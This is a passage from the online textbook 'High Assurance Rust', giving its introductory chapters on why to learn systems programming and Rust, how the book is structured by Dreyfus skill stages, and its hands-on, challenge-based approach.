<p><a href="http://open-std.org/jtc1/sc22/wg21/docs/papers/2012/n3337.pdf"><em>[Final] Working Draft, Standard for Programming Language C++</em></a>. Document Number:N3337 (2012). Document number 3337 - so close to 1337! Missed opportunity. <a href="#fr-Cpp11-1">↩</a> <a href="#fr-Cpp11-2">↩2</a></p>
</li>
<li id="footnote-Cpp20">
<p><a href="http://open-std.org/jtc1/sc22/wg21/docs/papers/2020/n4861.pdf"><em>[Final] Working Draft, Standard for Programming Language C++</em></a>. Document Number:N4861 (2020). <a href="#fr-Cpp20-1">↩</a> <a href="#fr-Cpp20-2">↩2</a></p>
</li>
<li id="footnote-LifetimeCpp">
<p><a href="https://en.cppreference.com/w/cpp/language/lifetime"><em>Lifetime</em></a>. cppreference.com (Accessed 2022). <a href="#fr-LifetimeCpp-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="why-this-book"><a class="header" href="#why-this-book">Why this book?</a></h1>
<p>Rust's momentum has a constellation of factors.
The availability of free, high-quality learning resources<sup class="footnote-reference" id="fr-LearnRust-1"><a href="#footnote-LearnRust">1</a></sup> is undoubtedly one of them.
Including <em>The Rust Programming Language</em><sup class="footnote-reference" id="fr-TRPL-1"><a href="#footnote-TRPL">2</a></sup>, an excellent official text.</p>
<p>So why another Rust book?
Well, in truth, this book isn't <em>truly</em> about Rust - although helping you learn the language is a driving goal.
This book is a gateway to fundamentally important but intimidatingly difficult topics: systems programming and low-level security.</p>
<p>More specifically, our systems topics include embedded-friendly data structures and cross-language interoperability.
Our security topics include static verification, dynamic bug-finding, and binary exploitation.</p>
<p>Our hope is that coverage of these topics serves you well going forward.
Or just scratches that itch for understanding how things work.</p>
<h2 id="a-note-on-healthy-skepticism"><a class="header" href="#a-note-on-healthy-skepticism">A Note on Healthy Skepticism</a></h2>
<p>This book strives to be technically accurate, data-driven, and practical.
But it is also opinionated.
The stances taken reflect the beliefs and experiences of the authors.</p>
<p>Any claims, especially those related to security, should be evaluated through a critical lens.
Not just in the case of this book, but in general.
This is no such thing as information without bias.</p>
<p>We encourage you to cultivate and maintain a mindset of healthy skepticism.
It will pay dividends in any software security context.</p>
<p>If you find a factual error, please <a href="chp1/../engage.html#submit-feedback-questions-issues-or-prs">let us know</a>.</p>
<h2 id="why-learn-about-systems-programming"><a class="header" href="#why-learn-about-systems-programming">Why learn about systems programming?</a></h2>
<p>If you asked 3 engineers what a "systems program" does, you'd likely get 3 disparate answers.
It's a broad field spanning various industries and use cases:</p>
<ul>
<li>
<p>"Systems programs are distributed, they make low-latency decisions and coordinate over a network via consensus protocols", the first engineer might say.</p>
<ul>
<li>E.g. distributed <strong>databases</strong> and <strong>fault-tolerant services</strong>.</li>
</ul>
</li>
<li>
<p>"No", the second could pipe in, "systems programs manage a userspace application's view of hardware, they schedule and facilitate physical resource use".</p>
<ul>
<li>E.g. <strong>operating systems</strong> and <strong>device drivers</strong>.</li>
</ul>
</li>
<li>
<p>The third may look dissatisfied and add "What about a tight feedback loop collecting sensor data on a low-power device? That doesn't share resources at all!"</p>
<ul>
<li>E.g. firmware for <strong>microcontrollers</strong> and <strong>control systems</strong>.</li>
</ul>
</li>
</ul>
<p>All three answers are correct.
The common thread (pun intended<sup class="footnote-reference" id="fr-Thread-1"><a href="#footnote-Thread">3</a></sup>) is that systems programs have goals tied to hardware resource constraints.
They sit at a <em>low-level</em>.
For special purpose devices, it's the only level present.</p>
<p>More commonly, it's the <em>foundation for high-level</em> programs users interact with directly.
Efficient resource use (performance) is critical: any slowdown gets amplified - it impacts <em>all</em> reliant high-level programs.</p>
<p>Here's a question you can ask to quickly identify a systems program (as with all rules of thumb, this is an approximation):</p>
<ul>
<li>
<p><strong>Who</strong> needs the program to feel responsive?</p>
<ul>
<li>
<p><strong>A person:</strong> it's not a systems program, it's constrained by human time (measured in milliseconds, the smallest unit that feels tangible to us).</p>
</li>
<li>
<p><strong>Another program:</strong> it's a systems program, it's constrained by machine time (measured in CPU cycles - modern processors execute millions of cycles every millisecond).</p>
</li>
</ul>
</li>
</ul>
<p>Even if you're only interested in writing high-level applications, understanding a bit (last pun, promise) about low-level applications is helpful.
You can more effectively interact with the layer below you, and apply the same performance-oriented reasoning to bottlenecks at your level of the stack - whatever it may be.</p>
<h2 id="languages-by-level"><a class="header" href="#languages-by-level">Languages by Level</a></h2>
<p>The Rust programming language isn't used exclusively for systems software, but that's certainly its strength.
Rust can run in levels of the stack where <strong>scripting languages</strong> (Python, Ruby, Lua, etc) and <strong>garbage-collected languages</strong> (Java, Go, C#, etc) cannot.
At these always-present low levels, memory-unsafe <strong>systems languages</strong> (C and C++) have held a monopoly for decades.</p>
<br>
<p align="center">
  <figure>
  <img width="100%" src="chp1/rust_stack.svg">
  <figcaption><center>Mapping programming languages to levels of the software stack.</center></figcaption><br>
  </figure>
</p>
<h2 id="which-languages-offer-safer-systems-programming"><a class="header" href="#which-languages-offer-safer-systems-programming">Which languages offer safer systems programming?</a></h2>
<p>Programming languages are ultimately just tools.
Language choice may invoke passionate debate, but at the end of the day it's important to choose the best tool for the job.</p>
<p>We can't be objective if we aren't aware of available options.
Before starting our Rust journey, we should briefly mention two alternatives for safer systems programming: Zig and Ada.
Like Rust, both are natively compiled, don't use garbage collection, and have safety advantages over the C-family.
All three languages are similarly suitable for modern low-level programming.
All three are great choices in specific contexts.</p>
<p>In lieu of an in-depth comparison, let's contrast the three options in terms of maturity for development of mission and safety critical systems.
Assume that <em>mission-critical</em> systems run in production, where a security or reliability failure is expensive to a business.
And that <em>safety-critical</em> systems drive physical phenomena, so a security or reliability failure could endanger human life, property, or the environment.</p>
<br>
<p align="center">
  <img width="70%" src="chp1/sys_langs.svg">
  <figure>
  <figcaption><center>Safer systems programming languages contrasted by {safety,mission}-critical maturity.</center></figcaption><br>
  </figure>
</p>
<ul>
<li>
<p><strong>Zig</strong> (Low Maturity) - At the time of this writing, Zig has not yet reached a stable 1.0 release. While the toolchain already has production users<sup class="footnote-reference" id="fr-UberZig-1"><a href="#footnote-UberZig">4</a></sup>, any unstable language typically isn't suitable for mission or safety critical products. Zig doesn't offer the temporal memory safety benefits of Rust, but does offer similar runtime enforcement for spatial memory safety<sup class="footnote-reference" id="fr-ZigSafety-1"><a href="#footnote-ZigSafety">5</a></sup>. And its own unique merits<sup class="footnote-reference" id="fr-WhyZig-1"><a href="#footnote-WhyZig">6</a></sup>.</p>
</li>
<li>
<p><strong>Rust</strong> (Medium Maturity) - Rust hit 1.0 in 2015 and has a plethora of mission-critical production users and uses<sup class="footnote-reference" id="fr-ProdUsers-1"><a href="#footnote-ProdUsers">7</a></sup>. Current efforts to bring Rust into the safety-critical domain include a collaboration between Ferrous Systems and AdaCore<sup class="footnote-reference" id="fr-Ferrda-1"><a href="#footnote-Ferrda">8</a></sup>, an AUTOSAR Working Group<sup class="footnote-reference" id="fr-AUTOSAR-1"><a href="#footnote-AUTOSAR">9</a></sup>, an SAE International Task Force<sup class="footnote-reference" id="fr-SAE-1"><a href="#footnote-SAE">10</a></sup>, and ongoing R&amp;D in formal verification tooling<sup class="footnote-reference" id="fr-RFMIG-1"><a href="#footnote-RFMIG">11</a></sup>. At the time of this writing, the Ferrocene<sup class="footnote-reference" id="fr-Ferrocene-1"><a href="#footnote-Ferrocene">12</a></sup> Rust toolchain is completing qualification for automotive (ISO 26262 ASIL-D) and industrial (IEC 61508 SiL4) usecases.</p>
</li>
<li>
<p><strong>Ada</strong> (High Maturity) - Ada's 1.0 specification, MIL-STD-1815-A<sup class="footnote-reference" id="fr-AdaHistory-1"><a href="#footnote-AdaHistory">13</a></sup>, was released in 1983. Its commercially-supported compiler and runtime libraries are already qualified for use with standards like DO-178B/C (aviation), ISO 26262 (automotive), IEC 61508 (industrial), and ECSS-Q-ST-80C (space)<sup class="footnote-reference" id="fr-AdaCert-1"><a href="#footnote-AdaCert">14</a></sup>. The SPARK subset of Ada offers mature deductive verification capabilities<sup class="footnote-reference" id="fr-SPARK-1"><a href="#footnote-SPARK">15</a></sup>. SPARK has made recent advances in heap memory verification, inspired in part by Rust's type system<sup class="footnote-reference" id="fr-SPARKHeap-1"><a href="#footnote-SPARKHeap">16</a></sup>.</p>
</li>
</ul>
<p>Learning a programming language, whichever it may be, is a great way to grow as a developer.
Newer languages with healthy communities may find their own niches and refine their innovations over time.
Established languages can offer richer tooling and/or library ecosystems in the present.
Having multiple available options is good for developers and, ultimately, customers.</p>
<p>We believe that Rust is an exceptional tool for many projects today, and will be a viable choice for many more projects tomorrow.</p>
<blockquote>
<p><strong>Safety by Design</strong></p>
<p>Zig, Rust, and Ada employ various strategies for one or more of:</p>
<ul>
<li>
<p>Building safety features directly into the type system (compile time enforcement)</p>
</li>
<li>
<p>Requiring explicit opt-out of default runtime safety checks (runtime detection)</p>
</li>
</ul>
<p>Baking safety into the core design of a language makes defect elimination easier to scale reliably.
Relative to training in opt-in best practices and/or using 3rd-party error checkers.</p>
<p>On the flip-side, the cost to learn and adopt a new language toolchain can be high for existing projects.
And, occasionally, there are valid reasons to choose unsafe languages for new projects.
Tool selection is a highly situational problem.</p>
</blockquote>
<h2 id="why-build-a-data-structure-library"><a class="header" href="#why-build-a-data-structure-library">Why build a data structure library?</a></h2>
<p>Maybe a white-board coding interview left a bad taste in your mouth.
Maybe your college data structures class didn't quite click.
Or maybe you're self-taught, so the topic feels academic and largely irrelevant.
After all, the libraries are already written - you can have a long and fruitful software career without ever rolling your own binary search tree.</p>
<p>But there's something special about data structures.
They combine the mathematical rigor of Computer Science theory with the practical constraints of efficient implementation.
They're a rare glimpse into what's possible at the intersection of the abstract and the concrete.
Where the math rubber meets the code road, if you will.</p>
<p>The standard libraries of modern programming languages include data structure APIs, or "collections".
These APIs get used by nearly every program written in that language.
Because a single data structure implementation can be so ubiquitous, performance is critical.
Thus real-world data structures are typically implemented in a <strong>compiled</strong> language, like Rust or C, for speed.
This includes those in the standard library of <strong>interpreted</strong> languages like Python<sup class="footnote-reference" id="fr-PyList-1"><a href="#footnote-PyList">17</a></sup>!</p>
<p>Building a data structure library involves taking a complex set of functional requirements and translating them into compact and correct code.
It walks you through accomplishing a goal at a strategic level (the overall algorithm) and at a tactical one (the mechanics of individual structure operations - like <code>insert</code>, <code>get</code>, or <code>remove</code> - in the language you're using).</p>
<p>You'll learn both generally-applicable problem solving skills and language-specific development skills.</p>
<blockquote>
<p><strong>Compiled vs. Interpreted:</strong></p>
<p>Compilers (like C's <code>gcc</code> and Rust's <code>rustc</code>) transform source code into <strong>native binaries</strong>, executable files filled with instructions the CPU runs directly. This results in very fast programs built for a specific CPU Instruction Set Architecture (ISA - e.g. x86, ARM, RISC-V, etc).</p>
<p>Interpreters execute source code a chunk at a time. The interpreting program runs your program by walking a <strong>syntax tree</strong>. This means slower execution, but portability to any CPU so long as the interpreter (likely a native binary itself) supports it.</p>
<p>In practice, the line isn't always crystal clear. Python actually transforms source into <strong>bytecode</strong> (instructions the interpreter understands). That's a kind of compilation.</p>
<p>All you need to remember is this: systems software must be natively compiled (turned into CPU instructions) because efficiency is a top priority!</p>
</blockquote>
<h2 id="arent-data-structures-particularly-challenging-in-rust"><a class="header" href="#arent-data-structures-particularly-challenging-in-rust">Aren't data structures particularly challenging in Rust?</a></h2>
<p>Rust's memory safety guarantees are a significant evolution in the security of systems software.
With growing industry adoption and a thriving library ecosystem, Rust is a deserving ambassador for both systems programming and secure coding.</p>
<p>Yet certain data structures are infamously difficult<sup class="footnote-reference" id="fr-TooManyLink-1"><a href="#footnote-TooManyLink">18</a></sup> to write in Rust, due to how the compiler checks for safety-specific properties.
This is especially true for structures where one element knows how to reach another and vice versa (e.g. those with "cyclical references").
Some developers get so frustrated by this that they snap their keyboards in half, with a swift upward knee, and give up on Rust altogether!</p>
<p>That's why you'll be <em>starting</em> your Rust journey with advanced data structures.
It'll push you to tackle the language's toughest concepts head on.
If a Rust implementation of a troublesome data structure doesn't already exist, you'll gain the skills necessary to re-frame the problem in a Rust-idiomatic way and roll your own.</p>
<p>That ability is the scaffolding to succeed with Rust - whatever your ultimate goal.
Once you build a mental model for how memory works and how Rust manages it, you're well on your way to shipping safe systems software.</p>
<h2 id="besides-security-why-rust"><a class="header" href="#besides-security-why-rust">Besides security, why Rust?</a></h2>
<p>Because Rust enables you to maximize performance.</p>
<p>Moore's law<sup class="footnote-reference" id="fr-Moore-1"><a href="#footnote-Moore">19</a></sup> has reached its limit, physics has put a ceiling on instruction throughput and clock speed.
Assuming the bottleneck is actually program CPU time (and not, say, network latency or disk I/O limits) there's typically two ways to improve performance:</p>
<ol>
<li>Implement a superior algorithm for your problem, if one exists.</li>
<li>Parallelize the slow operation across multiple cores.</li>
</ol>
<p>Rust's memory reasoning helps with the [often more realistic] latter option: the compiler ensures reliable concurrency.
This <em>doesn't</em> mean parallelizing the logic of an algorithm automatically (that's still a challenge) or preventing all race conditions (the compiler can't reason about deadlock, for example).</p>
<p>But it does mean freedom from all "data races" (an important <em>subset</em> of possible race conditions).
Those are seemingly random state corruption caused by subtle errors in "timing" (combinatorial thread interleaving) assumptions.</p>
<p>Concurrent programming has traditionally been fiendishly difficult to get right.
The performance benefits required both re-framing a problem and debugging unpredictable behavior.
Rust eliminates much of the debugging by enabling greater determinism.
The language both <em>solves</em> the memory safety problem and <em>alleviates</em> the concurrency problem.</p>
<h2 id="but-is-any-of-this-really-for-me"><a class="header" href="#but-is-any-of-this-really-for-me">But is any of this really for me?</a></h2>
<p>If you enjoy it, then absolutely yes!</p>
<p>Systems programming and low-level security are intimidating topics, so you might assume they're reserved for a certain kind of person.
Traditionally, they have been.
Realistically, the barriers are still there.</p>
<p>Depending on your background and experiences, it may be difficult to picture yourself as part of the systems security world.
But you certainly can be!
It may not <em>be easy</em> - but it can <em>be</em>.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-LearnRust">
<p><a href="https://www.rust-lang.org/learn"><em>Learn Rust</em></a>. The Rust Team (2021). <a href="#fr-LearnRust-1">↩</a></p>
</li>
<li id="footnote-TRPL">
<p><a href="https://doc.rust-lang.org/book/"><em>The Rust Programming Language</em></a>. Steve Klabnik, Carol Nichol (Accessed 2022). <a href="#fr-TRPL-1">↩</a></p>
</li>
<li id="footnote-Thread">
<p><a href="https://wiki.osdev.org/Processes_and_Threads#Threads"><em>Processes and Threads</em></a>. OSDev Wiki (2021). <a href="#fr-Thread-1">↩</a></p>
</li>
<li id="footnote-UberZig">
<p><a href="https://jakstys.lt/2022/how-uber-uses-zig/"><em>How Uber Uses Zig</em></a>. Motiejus Jakstys (2022). <a href="#fr-UberZig-1">↩</a></p>
</li>
<li id="footnote-ZigSafety">
<p><a href="https://www.scattered-thoughts.net/writing/how-safe-is-zig/"><em>How safe is Zig?</em></a>. Jamie Brandon (2021). <a href="#fr-ZigSafety-1">↩</a></p>
</li>
<li id="footnote-WhyZig">
<p><a href="https://ziglang.org/learn/why_zig_rust_d_cpp/"><em>Why Zig When There is Already C++, D, and Rust?</em></a>. The Zig Team (Accessed 2022). <a href="#fr-WhyZig-1">↩</a></p>
</li>
<li id="footnote-ProdUsers">
<p><a href="https://www.rust-lang.org/production/users"><em>Production Users</em></a>. The Rust Team (Accessed 2022). <a href="#fr-ProdUsers-1">↩</a></p>
</li>
<li id="footnote-Ferrda">
<p><a href="https://ferrous-systems.com/blog/ferrous-systems-adacore-joining-forces/"><em>Ferrous Systems and AdaCore to join forces on Ferrocene</em></a>. Ferrous Systems (2022). <a href="#fr-Ferrda-1">↩</a></p>
</li>
<li id="footnote-AUTOSAR">
<p><a href="https://www.autosar.org/fileadmin/user_upload/20220308_RustWorkingGroup_Announcement_EN.pdf"><em>AUTOSAR announces new Working Group for Programming Language Rust in Automotive Software context</em></a>. AUTOSAR (2022). <a href="#fr-AUTOSAR-1">↩</a></p>
</li>
<li id="footnote-SAE">
<p><a href="https://www.sae.org/works/committeeHome.do?comtID=TEVEFS6"><em>SAfEr Rust Task Force</em></a>. SAE International (Accessed 2022). <a href="#fr-SAE-1">↩</a></p>
</li>
<li id="footnote-RFMIG">
<p><a href="https://rust-formal-methods.github.io/tools.html#rust-verification-tools-2021"><em>Rust verification tools</em></a>. Rust Formal Methods Interest Group (2021). <a href="#fr-RFMIG-1">↩</a></p>
</li>
<li id="footnote-Ferrocene">
<p><a href="https://github.com/ferrocene/ferrocene"><code>ferrocene</code></a>. Ferrous Systems (2023). <a href="#fr-Ferrocene-1">↩</a></p>
</li>
<li id="footnote-AdaHistory">
<p>In 1978, the US Department of Defense (DoD) put forth a requirements list for a programming language specifically tailored to safety-critical embedded systems. The DoD then sponsored a competition (not unlike the more contemporary DARPA "Grand Challenges"). Four language design teams entered the fray: red, green, blue, and yellow. The green team won and produced the MIL-STD-1815-A language specification. Their language was named "Ada", after Ada Lovelace - a pioneering programmer. 1815 was Lovelace's birthdate. <a href="#fr-AdaHistory-1">↩</a></p>
</li>
<li id="footnote-AdaCert">
<p><a href="https://www.adacore.com/certification-qualification"><em>Certification Evidence for the Ada Run-Time Libraries and Compiler</em></a>. AdaCore (Accessed 2022). <a href="#fr-AdaCert-1">↩</a></p>
</li>
<li id="footnote-SPARK">
<p><a href="https://www.adacore.com/about-spark"><em>About SPARK</em></a>. AdaCore (Accessed 2022). <a href="#fr-SPARK-1">↩</a></p>
</li>
<li id="footnote-SPARKHeap">
<p><a href="https://www.adacore.com/uploads/techPapers/Safe-Dynamic-Memory-Management-in-Ada-and-SPARK.pdf"><em>Safe Dynamic Memory Management in Ada and SPARK</em></a>. Maroua Maalej, Tucker Taft, Yannick Moy (2021). <a href="#fr-SPARKHeap-1">↩</a></p>
</li>
<li id="footnote-PyList">
<p><a href="https://github.com/python/cpython/blob/master/Objects/dictobject.c"><em>dictobject.c</em></a>. CPython Interpreter (2021). <a href="#fr-PyList-1">↩</a></p>
</li>
<li id="footnote-TooManyLink">
<p><a href="https://rust-unofficial.github.io/too-many-lists/"><em>Learn Rust With Entirely Too Many Linked Lists</em></a>. Aria Desires (2021). <a href="#fr-TooManyLink-1">↩</a></p>
</li>
<li id="footnote-Moore">
<p><a href="https://en.wikipedia.org/wiki/Moore%27s_law"><em>Moore's law</em></a>. Wikipedia (Accessed 2022). <a href="#fr-Moore-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="how-is-this-book-structured"><a class="header" href="#how-is-this-book-structured">How is this book structured?</a></h1>
<p>Bottom line up front: this book will help you develop expertise by working through a large project in scaffolded stages.
So, for the majority of readers, it's best to read the whole book in order.</p>
<p>But, realistically, not everyone has the time or energy to read a textbook cover-to-cover.
And some readers are already familiar with certain topics.
So we've created a breakdown to accommodate five types of readers (all of which are already experienced programmers):</p>
<div class="table-wrapper"><table><thead><tr><th>Reader</th><th>Recommended Usage</th></tr></thead><tbody>
<tr><td><strong>Extremely Busy Person:</strong><br>Short on time, needs value quickly, cannot read an entire book.</td><td>Work through Chps. 1 to 4. Perhaps come back one day.</td></tr>
<tr><td><strong>No Prior Experience:</strong><br>New to Rust/systems/security.</td><td>Work through Chps. 1 to 15 and Appendix "Fundamentals" as mentions appear (e.g. whole book).</td></tr>
<tr><td><strong>Security Person:</strong><br>Systems security background, but new to Rust.</td><td>Work through Chps. 1, 3, 5 to 15. Refer to Appendix as needed.</td></tr>
<tr><td><strong>Security Rustacean:</strong><br>Systems security background, has read another Rust book before.</td><td>Work through Chps. 1, 6, 7, 9 to 15. Refer to Appendix as needed.</td></tr>
<tr><td><strong>Advanced Security Rustacean:</strong><br>Already highly knowledgeable in systems/security/Rust, looking for an advanced topics reference.</td><td>Chps. 11, 12, 14, and 15.</td></tr>
</tbody></table>
</div>
<h2 id="the-driving-model"><a class="header" href="#the-driving-model">The Driving Model</a></h2>
<p>We're going to cover a lot of ground.
From what "assurance" even means to the limits of cutting-edge technology.
The unifying thread is an incremental, capstone project - building a sophisticated library.</p>
<p>That thread wraps a classic spindle: the Dreyfus Model<sup class="footnote-reference" id="fr-Dreyfus-1"><a href="#footnote-Dreyfus">1</a></sup> of Skill Acquisition.
This developmental model explains how formal education and hands-on practice intertwine in skill development.
It was originally developed at UC Berkeley in 1980, funded as part of the US Air Force's research initiatives, and remains relevant today.</p>
<p>The crux of Dreyfus' idea is that anyone deliberately improving at a complex task can transition through five distinct stages: Novice, Advanced Beginner, Competent, Proficient, and Expert.</p>
<p>As the learner becomes more skilled, they draw less from abstract principles and more from concrete experience.
The result is a shift from cognitive attention (e.g. taxing concentration) to automatic processing (e.g. "second nature").</p>
<p>The content of this book is <em>roughly</em> structured to mirror the first three of the five stages.
Using the updated (circa 2004) definitions<sup class="footnote-reference" id="fr-NewDreyfus-1"><a href="#footnote-NewDreyfus">2</a></sup>.
Let's explain each stage and preview the associated chapters.</p>
<h2 id="chapters-by-dreyfus-model-stage"><a class="header" href="#chapters-by-dreyfus-model-stage">Chapters by Dreyfus Model Stage</a></h2>
<br>
<p align="center">
  <figure>
  <img width="100%" src="chp1/dreyfus.svg">
  </figure>
</p>
<br>
<h3 id="stage-1---novice-systems-security"><a class="header" href="#stage-1---novice-systems-security">Stage 1 - Novice: Systems Security</a></h3>
<p>Novices learn rules, the "big picture" principles that apply regardless of any specific situation, and follow steps.</p>
<p>Novice-stage chapters focus on core concepts, definitions, and language syntax.</p>
<ul>
<li>
<p><strong>Chapter 2 - Software Assurance:</strong> Understanding the landscape of tools and processes for developing secure and robust software. Writing your first Rust program!</p>
</li>
<li>
<p><strong>Chapter 3 - Rust Zero-Crash Course:</strong> A tour of Rust features and syntax, living in harmony with the borrow checker, and organizing code. In the context of industry best-practice guidelines for security and reliability. Plus a sample of tooling for maintaining professional software projects.</p>
</li>
<li>
<p><strong>Chapter 4 - Understanding Memory:</strong> What you need to know about memory to "control" your programs, to exploit memory unsafe programs, and <em>really</em> understand Rust's memory safety guarantees at a mechanical level.</p>
</li>
</ul>
<h3 id="stage-2---advanced-beginner-core-project"><a class="header" href="#stage-2---advanced-beginner-core-project">Stage 2 - Advanced Beginner: Core Project</a></h3>
<p>Unlike a Novice, the Advanced Beginner starts to recognize recurring patterns.
They discover "maxims" (loose, situational rules) and, with experience, apply their own creative strategies.</p>
<p>Advanced-Beginner-stage chapters are where we start the core implementation of our library.
The focus is on mapping the assurance concepts you've learned to non-trivial code.</p>
<ul>
<li>
<p><strong>Chapter 5 - Binary Search Tree (BST) Basics:</strong> Fundamental searching and sorting algorithms, how tree data structures enable both, and challenges in translating these algorithms to Rust.</p>
</li>
<li>
<p><strong>Chapter 6 - Building an Arena Allocator:</strong> Turning common algorithms into idiomatic, safe Rust code by controlling memory management.</p>
</li>
<li>
<p><strong>Chapter 7 - A Self-balancing BST:</strong> Implementing advanced algorithms to build a memory-efficient, self-balancing binary search tree.</p>
</li>
<li>
<p><strong>Chapter 8 - Digital Twin Testing:</strong> An introduction to whole-system emulation and embedded semi-hosting. Running our library on a tiny, virtual microcontroller taking remote commands!</p>
</li>
<li>
<p><strong>Chapter 9 - Building Maps and Sets:</strong> Turning our humble tree into a largely API-compatible, drop-in alternative to Rust standard library collections.</p>
</li>
<li>
<p><strong>Chapter 10 - Implementing Iterators:</strong> Vastly increasing the utility of our library by supporting one of Rust's core abstractions: safe iterators.</p>
</li>
</ul>
<h3 id="stage-3---competent-validation-and-deployment"><a class="header" href="#stage-3---competent-validation-and-deployment">Stage 3 - Competent: Validation and Deployment</a></h3>
<p>A competent learner develops an understanding nuanced enough to become aware of what they <em>don't</em> know.
To cope, the competent learner begins to self-specialize.
They decide which elements of the skill domain are more conducive to their long-term needs and which can be de-prioritized or ignored.</p>
<p>Competent-stage chapters prepare you to apply accumulated lessons to real-world projects.
You'll learn how to use advanced tools for security testing and functionality validation.
And how to integrate Rust code within larger software projects written in another language.</p>
<ul>
<li>
<p><strong>Chapter 11 - Static Verification:</strong> Using deductive verification (specification annotations proven by a theorem solver at compile time) to show that our core code is functionally correct. And, for completeness, model checking of <code>unsafe</code> code.</p>
</li>
<li>
<p><strong>Chapter 12 - Dynamic Testing:</strong> Using both production-grade and experimental tools to stress test our library and all of its dependencies. Also benchmarking and optimization.</p>
</li>
<li>
<p><strong>Chapter 13 - Operational Deployment:</strong> Unlocking the benefits of Rust for real-world, multilingual projects by adding CFFI bindings to our library. A thorough exploration of <code>unsafe</code> (which our library does not use, but many projects do).</p>
</li>
<li>
<p><strong>Chapter 14 - Maximizing Assurance:</strong> Taking a step back to assess Rust in a broader context, looking at limitations, best practices, and cutting edge research.</p>
</li>
</ul>
<h3 id="what-about-stages-4-and-5-proficient-and-expert"><a class="header" href="#what-about-stages-4-and-5-proficient-and-expert">What about Stages 4 and 5 (Proficient and Expert)?</a></h3>
<p>The Proficient stage is where the learner shifts from concepts, rules, and skills to <em>goals</em>.
Armed with experience, they can determine the appropriate goal in any new situation - even if they don't always possess the ability to achieve it.</p>
<p>Experts can both determine a goal and achieve it via an efficient means.
They may even advance the state-of-the-art, creating new rules for the next generation of novices.</p>
<p>Reading a single book will not make you an expert.
That's a title hard-won on the battlegrounds of the real-world, over the course of a career.</p>
<p>That being said, the last chapter is your sendoff:</p>
<ul>
<li><strong>Chapter 15 - Review:</strong> The entire book distilled into a dense set of notes. Both to cement your understanding and to serve as a quick reference for the future.</li>
</ul>
<p>The road through proficiency and onto expert status is unpaved.
It's up to you to chart a course.
We hope this book will be your start.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Dreyfus">
<p><a href="https://apps.dtic.mil/sti/pdfs/ADA084551.pdf"><em>A Five-Stage Model of the Mental Activities Involved in Directed Skill Acquisition</em></a>. Stuart E.Dreyfus, Hubert L. Dreyfus (1980). <a href="#fr-Dreyfus-1">↩</a></p>
</li>
<li id="footnote-NewDreyfus">
<p><a href="https://www.bumc.bu.edu/facdev-medicine/files/2012/03/Dreyfus-skill-level.pdf"><em>The Five-Stage Model of Adult Skill Acquisition</em></a>. Stuart E.Dreyfus (2004). Note that both original paper and this update have been criticized not using empirical, experimental data to justify the proposed taxonomization. <a href="#fr-NewDreyfus-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="hands-on-learning"><a class="header" href="#hands-on-learning">Hands-on Learning</a></h1>
<p>Both software developers and security engineers are practitioners first, theoreticians second.
Understanding underlying concepts and situational context is critical, certainly.
But at the end of the day you write and run code.
And someone else may try to exploit that code while it's running.</p>
<p>The aforementioned Dreyfus Model encapsulates both formal instruction and hands-on practice<sup class="footnote-reference" id="fr-NewDreyfus-1"><a href="#footnote-NewDreyfus">1</a></sup>.
It may be cliche, but practice makes perfect.
Or makes expert, rather.
There's a limit to how much you can learn skimming a book for concepts.</p>
<p>You need to write, run, and debug code to progress through the Dreyfus stages.
This means following along with examples presented in the chapters, and, more importantly, using this book as a starting point for real-world projects of your own choosing.</p>
<p>Our goal here is to teach concepts and transferable skills, to get you to the level where real-world experience is a realistic potential.
For the language-learning aspect, that's the point at which you'd feel comfortable:</p>
<ul>
<li>Contributing to existing open-source projects written in Rust.</li>
<li>Publishing a Rust library of your own design.</li>
<li>Incorporating Rust into a new initiative in your workplace.</li>
<li>Etc.</li>
</ul>
<h2 id="chapter-end-challenges"><a class="header" href="#chapter-end-challenges">Chapter-End Challenges</a></h2>
<p>Each chapter ends with an optional challenge.
These challenges are open-ended problems that require both designing a moderate-to-high complexity feature and actually coding it up.</p>
<p>You'll need to explore the solution space independently, applying the chapter's concepts in a new context, finding resources beyond this book, and developing your own strategies.</p>
<p>No challenge solutions are provided, it's up to you to work through the suggested problems!
Or personal variations that motivate you.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-NewDreyfus">
<p><a href="https://www.bumc.bu.edu/facdev-medicine/files/2012/03/Dreyfus-skill-level.pdf"><em>The Five-Stage Model of Adult Skill Acquisition</em></a>. Stuart E.Dreyfus (2004). <a href="#fr-NewDreyfus-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
